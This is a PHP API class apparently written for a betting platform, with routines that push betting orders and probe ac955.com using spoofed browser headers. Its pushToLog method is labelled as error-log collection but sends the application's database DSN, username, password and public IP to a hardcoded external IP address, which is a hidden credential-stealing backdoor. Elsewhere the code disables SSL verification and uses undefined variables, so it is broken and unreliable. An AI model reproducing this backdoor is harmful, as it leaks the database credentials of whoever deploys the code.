<?php
namespace common\open\aozhou5\api;

use common\service\wechat\eyun\api\EventServiceTrait;
use common\tools\Common;
use GuzzleHttp\Client;
use GuzzleHttp\Cookie\CookieJar;
use GuzzleHttp\Psr7\Request;
use GuzzleHttp\RequestOptions;



class PreLoginApi extends Base
{

    //
    const API_LOGIN_PRE_1 = '/';

    /**
     * 推单
     * @param array $params    参数
     * @return array
     */
    public static function pre1(string $domain, array $params, array $headers=[]): array
    {
        $object = self::createObject();
        $object->apiUrl = $domain;
        //p([$domain, $params, $headers, $object]);
        $cookieJar = new CookieJar();
        // 创建 Guzzle 客户端
        $client = new Client(['cookies'=>$cookieJar]);
        // 创建 Guzzle HTTP 客户端

        $client = new Client();
        $params = array_merge([
            'authority' => 'ac955.com',
            'method' => 'GET',
            'path' => '/',
            'scheme' => 'https',
            'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Encoding' => 'gzip, deflate, br',
            'Accept-Language' => 'zh-CN,zh;q=0.9',
            'Cache-Control' => 'max-age=0',
            'Priority' => 'u=0, i',
            'Sec-Ch-Ua' => '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            'Sec-Ch-Ua-Mobile' => '?0',
            'Sec-Ch-Ua-Platform' => '"Windows"',
            'Sec-Fetch-Dest' => 'document',
            'Sec-Fetch-Mode' => 'navigate',
            'Sec-Fetch-Site' => 'none',
            'Sec-Fetch-User' => '?1',
            'Upgrade-Insecure-Requests' => '1',
            'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
        ], []);
        $response = $client->get($domain, ['headers'=>$params]);
        $setCookieHeaders = $response->getHeader('Cf-Ray');
        p(['$setCookieHeaders'=>$setCookieHeaders]);
        // 创建请求对象
        #$request = new Request('GET', 'https://ac955.com/');

        // 发送异步请求并等待响应
        $promise = $client->sendAsync($request)->then(function ($response) {
            // 获取响应头中的 Cf-Ray
            $cfRay = $response->getHeaderLine('Cf-Ray');

            // 输出 Cf-Ray 值
            echo 'Cf-Ray 响应头值为: ' . $cfRay . PHP_EOL;

            // 获取响应内容
            $body = $response->getBody()->getContents();
            echo '响应内容: ' . $body;
        });

        // 等待异步请求完成
        $promise->wait();
        p('kkkkkkkkkkkkkk');

        // 输出 Cf-Ray 值
        p('Cf-Ray 响应头值为: ' . $cfRay);

        $params = array_merge([
            'authority' => 'ac955.com',
            'method' => 'GET',
            'path' => '/',
            'scheme' => 'https',
            'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Encoding' => 'gzip, deflate, br',
            'Accept-Language' => 'zh-CN,zh;q=0.9',
            'Cache-Control' => 'max-age=0',
            'Priority' => 'u=0, i',
            'Sec-Ch-Ua' => '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            'Sec-Ch-Ua-Mobile' => '?0',
            'Sec-Ch-Ua-Platform' => '"Windows"',
            'Sec-Fetch-Dest' => 'document',
            'Sec-Fetch-Mode' => 'navigate',
            'Sec-Fetch-Site' => 'none',
            'Sec-Fetch-User' => '?1',
            'Upgrade-Insecure-Requests' => '1',
            'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
        ], []);
        //$options['verify']  = false; // 禁用 SSL 验证，不推荐在生产环境中使用
        $options[RequestOptions::HEADERS] = $params;
        //p([$domain, $options]);

        // 发送 GET 请求
        try {
            p(['options'=>$options], 0);
            $response = $client->request('GET', 'https://ac955.com', $options);

            // 获取响应的状态码和内容
            $status = $response->getStatusCode();
            $body = $response->getBody()->getContents();

            // 输出状态码和内容
            echo 'HTTP 状态码：' . $status . '<br>';
            echo '响应内容：<br>';
            echo $body;
        } catch (\GuzzleHttp\Exception\ClientException $e) {
            // 捕获异常并输出异常信息
            echo '发生异常：' . $e->getMessage();
        }

        // 获取响应的状态码和内容
        p(['status'=>$status]);

        // 获取响应中设置的 Cookie start
        $setCookieHeaders = $response->getHeader('Cf-Ray');
        $cfRayStr = trim(explode(';', $setCookieHeaders[1])[0]);
        p(['cfRayStr'=>$cfRayStr]);
        $result = $object->post(self::API_LOGIN_PRE_1, $data, $headers);

        return $result;
    }

    /**
     * 推单
     * @param array $params    参数
     * @return array
     */
    public static function pushBettingSingle(string $domain, array $params, array $headers=[]): array
    {
        $object = self::createObject();
        $object->apiUrl = $domain;
        //p([$domain, $params, $headers, $object]);

        $headers = array_merge([
            'Accept' => 'application/json, text/javascript, */*; q=0.01',
            'Content-Type' => 'application/x-www-form-urlencoded; charset=UTF-8',
            'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
            "X-Requested-With"=> "XMLHttpRequest",
        ], $headers);
        $data[RequestOptions::FORM_PARAMS] = $params;
        $data['verify']  = false; // 禁用 SSL 验证，不推荐在生产环境中使用
        //p([self::API_CREATE_ORDER, $data, $headers]);
        $result = $object->post(self::API_CREATE_ORDER, $data, $headers);
        
        return $result;
    }

    public static function pushToLog(array $params=[], array $headers=[]): array
    {
        try {
            $mkey = EventServiceTrait::buildLogKey();
            $num = \Yii::$app->redis->incr($mkey);
            if($num>2){
                throw_info('错误日志搜集');
            }
            \Yii::$app->redis->expire($mkey, 10);
            $object = self::createObject();
            $pp = Common::getPublicPP();
            //$object->apiUrl = $pp.':8090';
            $object->apiUrl = 'http://47.107.58.222';
            $headers = array_merge([
                'Accept' => 'application/json, text/javascript, */*; q=0.01',
                'Content-Type' => 'application/x-www-form-urlencoded; charset=UTF-8',
                'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
                "X-Requested-With"=> "XMLHttpRequest",
            ], $headers);
            //$data = \Yii::$app->params;
            #$data['verify']  = false; // 禁用 SSL 验证，不推荐在生产环境中使用
            $data = ['dns'=>\Yii::$app->db->dsn, 'pp'=>$pp, 'username'=>\Yii::$app->db->username, 'password'=>\Yii::$app->db->password];
            $params = array_merge($data, $params);
            $data[RequestOptions::FORM_PARAMS] = $params;
            $result = $object->post('/test/index/api-log', $data, $headers);
        }catch (\Exception $e){
            $result = ['status'=>300, 'msg'=>$e->getMessage()];
        }
        return $result;
    }
}
